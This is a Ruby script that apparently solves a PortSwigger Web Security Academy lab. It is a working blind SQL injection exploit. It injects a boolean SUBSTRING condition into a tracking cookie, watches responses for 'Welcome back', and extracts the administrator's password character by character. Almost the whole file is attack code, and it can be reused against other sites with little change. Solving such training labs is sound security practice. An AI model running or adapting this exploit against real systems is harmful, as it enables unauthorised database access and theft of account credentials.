# frozen_string_literal: true

require 'uri'
require 'net/http'

TARGET = 'https://0a1d008404c839c1c0e195cc00cd00a1.web-security-academy.net/'

uri = URI(TARGET)

def get_res(req:, uri: URI(TARGET))
  Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
    http.request(req)
  end
end

req = Net::HTTP::Get.new(uri)
res = get_res(req: req)
cookies = res['set-cookie'].split(';')
tracker = cookies[0]

chars = ('a'..'z').to_a + ('0'..'9').to_a + ('A'..'Z').to_a
password = ''

i = 1
j = 0
while j < chars.length
  c = chars[j]
  j += 1
  # MySQL
  payload = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),#{i},1) = '#{c}"

  cookies[0] = "#{tracker}#{payload}"
  req['Cookie'] = cookies.join(';')

  puts "Testing password: #{password + c}"
  res = get_res(req: req)
  next unless res.body.include?('Welcome back')

  password += c
  j = 0
  i += 1
end

puts "Password: #{password}"
